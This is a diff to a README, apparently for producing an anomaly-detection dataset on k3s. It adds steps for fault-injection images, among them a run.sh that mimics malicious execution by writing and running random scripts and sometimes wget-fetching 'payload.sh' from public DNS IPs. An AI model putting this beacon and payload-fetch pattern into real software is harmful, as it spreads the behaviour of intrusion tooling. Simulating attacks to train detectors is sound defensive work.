@@ -198,6 +198,134 @@ kubectl apply -f tcp-connect-policy.yaml
 
 To generate the final dataset, strictly follow this execution order across three terminals.
 
+### build this image for crash loop fault
+
+1️⃣ Create Crash-Loop Image
+
+Inside your VM.
+
+📁 Create folder
+mkdir -p crash-loop-image
+cd crash-loop-image
+📄 Dockerfile
+
+Create:
+
+nano Dockerfile
+
+Paste:
+
+FROM alpine:latest
+
+RUN apk add --no-cache stress-ng
+
+CMD ["/bin/sh"]
+
+Save.
+
+✅ 2️⃣ Build Image (Inside VM)
+docker build -t crash-loop-stress:latest .
+✅ 3️⃣ Import Image Into k3s (IMPORTANT)
+
+k3s uses containerd, not Docker.
+
+So run:
+
+docker save crash-loop-stress:latest | sudo k3s ctr images import -
+
+Verify:
+
+sudo k3s ctr images list | grep crash-loop
+
+You should see:
+
+crash-loop-stress:latest
+
+plus Build inside VM
+docker build -t suspicious-network:latest .
+Import into k3s
+docker save suspicious-network:latest | sudo k3s ctr images import -
+
+Verify:
+
+sudo k3s ctr images list | grep suspicious
+
+Step 1 — Create Image Directory
+
+Inside VM:
+
+mkdir security-tmp-exec-image
+cd security-tmp-exec-image
+✅ Step 2 — Payload Script (Moved From YAML)
+
+Create:
+
+nano run.sh
+📄 run.sh
+#!/bin/sh
+
+echo "Simulating malicious execution from ${EXEC_PATH}..."
+
+TARGETS="1.1.1.1 8.8.8.8 9.9.9.9"
+
+mkdir -p ${EXEC_PATH}
+
+while true; do
+
+  # Random filename (polymorphic payload)
+  RAND=$RANDOM
+  SCRIPT="${EXEC_PATH}/bad_${RAND}.sh"
+
+  echo "#!/bin/sh" > $SCRIPT
+  echo "echo Malicious execution id $RAND" >> $SCRIPT
+  echo "echo RANDOM_VALUE=$RANDOM" >> $SCRIPT
+
+  chmod +x $SCRIPT
+
+  # Execute payload
+  $SCRIPT
+
+  ###################################
+  # Occasional network beacon/payload
+  ###################################
+  if [ $((RANDOM % 4)) -eq 0 ]; then
+      TARGET=$(echo $TARGETS | tr ' ' '\n' | shuf -n1)
+      echo "Fetching remote payload from $TARGET"
+      wget -q --timeout=2 http://$TARGET/payload.sh -O /dev/null || true
+  fi
+
+  # Random execution interval
+  sleep $((RANDOM % EXEC_INTERVAL + 1))
+
+done
+
+Make executable:
+
+chmod +x run.sh
+✅ Step 3 — Dockerfile
+
+Create:
+
+nano Dockerfile
+📄 Dockerfile
+FROM alpine:latest
+
+RUN apk add --no-cache wget coreutils
+
+COPY run.sh /run.sh
+
+RUN chmod +x /run.sh
+
+ENTRYPOINT ["/run.sh"]
+✅ Step 4 — Build Image (Inside VM)
+docker build -t security-tmp-exec:latest .
+✅ Step 5 — Import Into k3s
+docker save security-tmp-exec:latest | sudo k3s ctr images import -
+
+Verify:
+
+sudo k3s ctr images list | grep security-tmp
+
 ### Terminal 1: Start Normal Workloads
 Deploy the standard background noise (Nginx, Redis, APIs).
 ```bash
